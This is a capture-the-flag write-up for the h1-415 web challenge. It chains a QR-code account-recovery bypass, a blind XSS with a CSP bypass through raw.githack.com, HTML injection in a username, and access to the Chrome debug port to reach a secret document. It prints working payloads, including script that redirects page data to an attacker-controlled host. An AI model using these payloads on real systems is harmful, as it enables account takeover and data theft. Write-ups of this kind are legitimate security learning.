Summary:

## TL;DR:

Thanks for the challenge!

1. Abusing account recovery via QR codes to get access to jobert@mydocz.cosmic.
2. Blind XSS in `/support/review/<review_id>` (including CSP bypass).
3. Missing input sanitization on `name` parameter when POSTing to `/support/review/<review_id>`.
4. Access to remote debugging port on local Chrome instance leaking ID of secret document.
5. **h1ctf{y3s_1m_c0sm1c_n0w}**

I also included a python script F691360 which is going through the whole challenge (it's a result of a number of scripts I used to automate repetitive tasks).

## Details

### Introduction

https://h1-415.h1ctf.com hosted a simple web application allowing to convert images into PDF files. Anyone could register a trial account. Signing in would give access to the converter and basic account management which allowed only a name change. The converter allowed to upload JPG and PNG files only. The resulting PDF would include the uploaded image and the user's name.

### Step 1 - One '{' is all it takes.

After a few attempts to include HTML in my user name (`<` and `>` were filtered) or trying to upload arbitrary files, both ways seemed as dead ends. I decided to focus on the account recovery flow. 

After a successful registration, the application would generate a QR code for account recovery. The QR code was a string in the following format:

```
ascii_hex(user@example.com):<some_random_secret_in_hex>
```

After submitting the QR code to `/recover`, the applicaion would respond with a new session giving access to the user account. After some trial and error, I noticed that the application would right-strip `{` (and any subsequent `{` and `}`) characters from the email when generating the QR code.

This meant that registering with `jobert@mydocz.cosmic{` would give back a valid QR code for `jobert@mydocz.cosmic`.

### Step 2 - Wow that's cosmic.

After logging in as `jobert@mydocz.cosmic` the support chat would became available as Jobert was a proper customer. The first thing I did was sending `flag` into the support chat. The response was as follows:

```
{"response":"I love flags! Where is yours? Wait... I think someone is converting top secret documents as we speak!"}
```

This response would led me to the deepest rabbit hole I've ever went down. 

Anyway, inspecting the JavaScript files included in the page, I learned that it's possible to end the chat with `quit` or `finish`. Once a chat ended, the application would ask for feedback, claiming that a negative, 1-star feedback would be reviewed by support staff. This just begs for blind XSS.

Submitting a simple XSS payload would confirm that vulnerability on the current page. However, there was a CSP preventing inline script execution:

```
Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self' https://raw.githack.com/mattboldt/typed.js/master/lib/; img-src data: *
```

Seeing that CSP instantly reminded me of [Michał Bentkowski's tweet](https://twitter.com/SecurityMB/status/1162690916722839552). It turns out that raw.githack.com would decode the URL path and therefore it was trivial to bypass using:

```
<script src='https://raw.githack.com/mattboldt/typed.js/master/lib%252f..%252f..%252f..%252f..%252fbayotop/playground/master/g2.js'></script>
```

The first payload that I used was `fetch('https://<domain-under-my-control>')` to confirm the vulnerability. However, because of the `default-src` directive it wasn't possible to make connections other than to `self` (`connect-src`). I ended up bypassing this via `window.location = 'https://<domain-under-my-control>'`.

As you can see [in my commit history](https://github.com/bayotop/playground/commits/master) I was stuck at this point for quite a while. The page was rendered in a headless Chrome instance without an authenticated session. As it turned out, the only information needed to proceed to the next step was a glimpse on the DOM and `window.location`.

### Step 3 - One HTML injection isn't enough. 

The DOM revealed that the support stuff had the ability to change a user's name. Using any authenticated session, it was possible to change any user name except for users with ids 1 and 2. Moreover, the name wasn't sanitized this time! This allowed to change a user's name to HTML that would be rendered during the PDF conversion. I quickly confirmed this using `<iframe src='https://<domain-under-my-control>'></iframe>`. Afterwards, I used a different payload - `<script>window.location='http://ip-under-my-control'+window.location</script>` - to learn the context I was in. 

It was `http://localhost:3000/converter/<random-id>.png?user_name=<user_name>`. This meant that I couldn't simply access `file://`.

### Step 4 - The "secret" was 9222.

At this point I got stuck for a long long time. I tried to find other services listening locally (using [aquatone's xlarge list](https://github.com/michenriksen/aquatone)). I was looking for parameter injection through the user name trying to inject `--allow-file-access-from-file` when starting the Chrome instance. I tried to discover new endpoints and look for differences on existing ones when served locally.

I had a lightbulb moment: `I think someone is converting top secret documents as we speak!`. Was the support chat message a hint? It had to be user with id 1. Using the registration form, I figured that the user's username and email were `admin` and `admin@mydocz.cosmic`). It wasn't possible to recover into that account. It all made sense. I had to use the support staff's endpoint to change the admin's user name to `<script>window.location='http://<ip-under-my-control>'</script>` and wait for the admin to upload a file. I tried SQL, NoSQL, XPath injections. I tried path traversal ([jobert's older tweet](https://twitter.com/jobertabma/status/1071091295425191937) was a really good candidate). I tried all possible encodings. The application was kind of slow to respond and after every 500 it would timeout for a few minutes, so all of this took ages. Nothing worked.

While doing my fuzzing I have accidentally overwritten the user name of a bunch other users. At least one noticed as they sent me a message:

```
/var/log/nginx/access.log ... "GET /?x=stop_messing_with_mydocz_account_im_jobert_and_i_need_it HTTP/1.1" ...
/var/log/nginx/access.log ... "GET /?x=see_you_in_San_Francisco HTTP/1.1" ...
/var/log/nginx/access.log ... "GET /?x=but_Im_gonna_snatch_the_swag_pack HTTP/1.1" ...
```

I'm super sorry for interfering! Hopefully I didn't cause too much harm. Please let me know if you managed to grab that swag pack (ideally once we meet in SF :)).

I started to realize this wouldn't work, however, I had no other ideas. Until I saw these 2 messages in a Slack thread (thanks [@soiaxx](https://twitter.com/soiaxx)):

```
if it's chrome headless and u can see the generated pdf, and u can access the devtools port on localhost:9222 by default.... you can access file:// :stuck_out_tongue:
if you can run javascript :smile: so much ifs
```

*For the sake of transparency, it was a completely unrelated thread. I'm not sure if the involved parties knew about this particular CTF.*

I tried setting my user name to `<iframe width=900 height=900 src="http://localhost:9222/"></iframe>` and uploaded a file. It worked, it rendered two words: "Inspectable WebContents". [This StackOverflow answer](https://stackoverflow.com/a/29893173/5136654) mentions a `/json` endpoint showing available debug targets. Jackpot:

{F691310}

Requesting https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab would reveal the flag: **h1ctf{y3s_1m_c0sm1c_n0w}**.

## Impact

Mostly sleep deprivation.
